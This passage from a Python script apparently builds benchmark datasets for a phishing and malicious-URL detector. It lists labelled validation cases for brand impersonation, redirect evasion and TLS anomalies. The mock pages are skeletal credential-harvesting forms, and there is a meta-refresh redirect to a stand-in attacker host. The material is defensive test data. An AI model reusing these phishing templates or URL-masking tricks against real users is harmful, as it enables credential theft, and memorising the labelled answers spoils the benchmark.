        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Citibank financial brand impersonation registered on high-abuse .live TLD.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/collect\"><input name=\"cardnumber\"/><input name=\"cvv\"/></form></body></html>"
            }
        }
    },
    {
        "id": "VAL-020",
        "url": "http://uidai-aadhaar-update-portal.xyz",
        "normalizedDomain": "uidai-aadhaar-update-portal.xyz",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "MALICIOUS",
        "provenance": "Indian national identity authority (UIDAI / Aadhaar) impersonation on .xyz TLD.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/harvest\"><input name=\"aadhaar\"/><input name=\"otp\"/></form></body></html>"
            }
        }
    },
    {
        "id": "VAL-021",
        "url": "http://glassdoor-recruitment-interview.xyz",
        "normalizedDomain": "glassdoor-recruitment-interview.xyz",
        "category": "BRAND_IMPERSONATION_SUBDOMAIN_STACKING",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Career portal impersonation on high-abuse .xyz TLD.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Schedule Interview</h1></body></html>"
            }
        }
    },

    # 7. Malicious Redirects & Evasions (2 cases)
    {
        "id": "VAL-022",
        "url": "http://official-gov-portal.org@credential-trap.xyz/login",
        "normalizedDomain": "credential-trap.xyz",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "MALICIOUS",
        "provenance": "Userinfo authority masking simulating official government portal while routing to credential-trap.xyz.",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><form action=\"/steal\"><input type=\"password\" name=\"p\"/></form></body></html>"
            }
        }
    },
    {
        "id": "VAL-023",
        "url": "http://fast-redirect-bounce.net/gate",
        "normalizedDomain": "fast-redirect-bounce.net",
        "category": "MALICIOUS_REDIRECTS_EVASIONS",
        "groundTruth": "MALICIOUS",
        "provenance": "Client-side meta refresh redirecting to external attacker drop host (attacker-drop.biz).",
        "mockContext": {
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=http://attacker-drop.biz/landing\"/></head><body>Redirecting...</body></html>"
            }
        }
    },

    # 8. Certificate & TLS Anomalies (2 cases)
    {
        "id": "VAL-024",
        "url": "https://diginotar-compromised-root.net",
        "normalizedDomain": "diginotar-compromised-root.net",
        "category": "CERTIFICATE_TLS_ANOMALIES",
        "groundTruth": "MALICIOUS",
        "provenance": "Certificate issued by DigiNotar, a permanently revoked and untrusted CA root.",
        "mockContext": {
            "tls": {"status": "distrusted_ca", "ca_pattern": "diginotar"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Secure Portal</h1></body></html>"
            }
        }
    },
    {
        "id": "VAL-025",
        "url": "https://self-signed-corporate-gateway.org",
        "normalizedDomain": "self-signed-corporate-gateway.org",
        "category": "CERTIFICATE_TLS_ANOMALIES",
        "groundTruth": "SUSPICIOUS",
        "provenance": "Self-signed certificate on public .org gateway domain without trusted CA chain.",
        "mockContext": {
            "tls": {"status": "self_signed"},
            "http": {
                "status_code": 200,
                "headers": {},
                "html_body": "<!DOCTYPE html><html><body><h1>Corporate Gateway</h1></body></html>"
            }
        }
    }
]


def main():
    bench_dir = Path(__file__).resolve().parent
    dev_path = bench_dir / "dataset_dev.json"
    val_path = bench_dir / "dataset_val.json"

    with open(dev_path, "w", encoding="utf-8") as f:
        json.dump(DEV_CASES, f, indent=2)

    with open(val_path, "w", encoding="utf-8") as f:
        json.dump(VAL_CASES, f, indent=2)

    print(f"Successfully generated {len(DEV_CASES)} development cases in {dev_path}")
    print(f"Successfully generated {len(VAL_CASES)} validation cases in {val_path}")


if __name__ == "__main__":
    main()
